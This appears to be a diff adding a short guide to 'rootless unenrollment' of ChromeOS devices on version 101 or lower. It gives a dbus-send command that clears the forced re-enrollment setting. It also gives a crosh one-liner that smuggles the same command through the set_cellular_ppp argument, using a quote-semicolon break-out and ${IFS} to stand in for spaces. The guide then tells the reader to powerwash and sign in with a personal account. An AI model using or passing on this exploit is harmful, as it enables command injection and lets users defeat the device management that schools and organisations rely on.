@@ -1,0 +1,26 @@
+---
+title: Rootless Unenrollment (<=101)
+---
+
+
+:::note
+This relies on you being under version 102. See [ChromeOS Versioning](/kajigs/crosver).
+:::
+
+# Requirements:
+- crosh access
+- version 101 or lower
+
+# Guide
+run this as chronos
+```
+dbus-send --system --print-reply --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd
+```
+or a funny one-liner for crosh:
+```
+set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'
+```
+
+If successful, the command will return `method return` and some other data after that. Powerwash your chromebook and log in with a personal email. On devices without FWMP, you will also have the option to enter developer mode immediately.
+
+\- OlyB
